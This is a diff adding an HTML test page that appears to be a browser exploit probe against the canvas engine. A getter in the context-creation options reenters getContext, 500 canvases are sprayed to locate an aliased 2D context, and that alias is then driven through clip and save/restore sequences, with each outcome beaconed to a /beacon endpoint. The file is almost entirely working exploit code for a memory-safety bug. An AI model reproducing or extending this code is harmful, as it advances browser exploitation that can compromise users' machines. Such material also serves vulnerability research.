@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V962B</title></head>
+<body><pre id="out">V962B — alias clip/path × save/restore oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+var al=null;
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V962B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+function pixInfo(){
+  try{
+    var c=al.canvas; if(!c) return 'nocanvas';
+    var ctx=c.getContext('2d'); if(!ctx) return 'noctx';
+    var d=ctx.getImageData(10,10,1,1).data;
+    return d[0]+','+d[1]+','+d[2]+','+d[3];
+  }catch(e){ return 'pixEx:'+String(e&&e.name); }
+}
+async function establishAlias(){
+  bk('BOOT','single-run clip/path×save/restore on live alias; run='+RUN+'; primary oracle=EX/crash/missing OK');
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return false; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
+  bk('SPRAY','500');
+  var found=-1;
+  try{ inner.lineWidth=12121.21; }catch(e){ bk('W1-ERR',String(e)); return false; }
+  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-12121.21)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  return found>=0;
+}
+(async function(){
+  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  // A: basic clip save/restore
+  bk('A-PRE','clip+save+restore');
+  try{
+    al.save();
+    al.beginPath(); al.rect(0,0,20,20); al.clip();
+    al.fillStyle='#ff0000'; al.fillRect(0,0,64,64);
+    al.restore();
+    bk('A-OK','pix='+pixInfo());
+  }catch(e){ bk('A-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  // B: nested clips
+  bk('B-PRE','nested3 clips');
+  try{
+    al.save(); al.beginPath(); al.rect(0,0,50,50); al.clip();
+    al.save(); al.beginPath(); al.arc(32,32,20,0,Math.PI*2); al.clip();
+    al.save(); al.beginPath(); al.rect(10,10,10,10); al.clip();
+    al.fillStyle='#00ff00'; al.fillRect(0,0,64,64);
+    al.restore(); bk('B-r3','ok');
+    al.restore(); bk('B-r2','ok');
+    al.restore(); bk('B-r1','pix='+pixInfo());
+  }catch(e){ bk('B-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  // C: 50 cycles
+  bk('C-PRE','50 cycles');
+  try{
+    for(var i=0;i<50;i++){
+      al.save();
+      al.beginPath(); al.rect(i%20,i%20,10+(i%15),10+(i%15)); al.clip();
+      if(i%5===0){ al.beginPath(); al.arc(20,20,5+(i%10),0,6.283); al.clip(); }
+      al.restore();
+    }
+    bk('C-OK','50/50 pix='+pixInfo());
+  }catch(e){ bk('C-EX','i? '+String(e&&e.name)+':'+String(e).slice(0,120)); }
+  // D: complex paths
+  bk('D-PRE','complex paths');
+  try{
+    al.save();
+    al.beginPath();
+    al.moveTo(0,0); for(var i=1;i<100;i++) al.lineTo((i*7)%64,(i*13)%64);
+    al.closePath(); al.clip();
+    al.fillStyle='#0000ff'; al.fillRect(0,0,64,64);
+    al.restore();
+    al.save();
+    al.beginPath(); al.rect(5,5,30,30); al.rect(10,10,10,10); al.clip('evenodd');
+    al.restore();
+    bk('D-OK','pix='+pixInfo());
+  }catch(e){ bk('D-EX',String(e&&e.name)+':'+String(e).slice(0,120)); }
+  bk('DONE','clip×savestack complete; primary oracle=EX/crash/missing OK (pix informational)');
+  say('done run='+RUN);
+})();
+</script>
+</body></html>
